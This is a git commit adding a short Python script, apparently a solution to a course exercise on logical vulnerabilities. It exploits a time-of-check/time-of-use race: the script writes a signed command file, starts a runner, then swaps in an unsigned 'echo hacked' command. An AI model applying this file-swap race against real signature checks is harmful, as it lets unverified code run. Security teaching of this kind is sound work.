711fb93442d3f4152fd3be9bc08b5ca56410564b
Itamar-Shor <65439487+Itamar-Shor@users.noreply.github.com>
2022-02-16 17:46:21 +0200

    Add files via upload

---
+++ Logical Vulnerabilities/q5/q5.py
@@ -0,0 +1,23 @@
+import json
+import time
+import subprocess
+import sys
+
+def main(argv):
+    path = ".//foo"
+    good_script = {"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}
+    evil_script = {"command": "echo hacked"}
+
+    with open(path, 'w') as writer:
+        writer.write(json.dumps(good_script))
+
+    pid = subprocess.Popen([sys.executable, "./run.py", path]) # Call subprocess
+    time.sleep(2)
+
+    with open(path, 'w') as writer:
+        writer.write(json.dumps(evil_script))
+
+
+if __name__ == '__main__':
+    import sys
+    sys.exit(main(sys.argv))
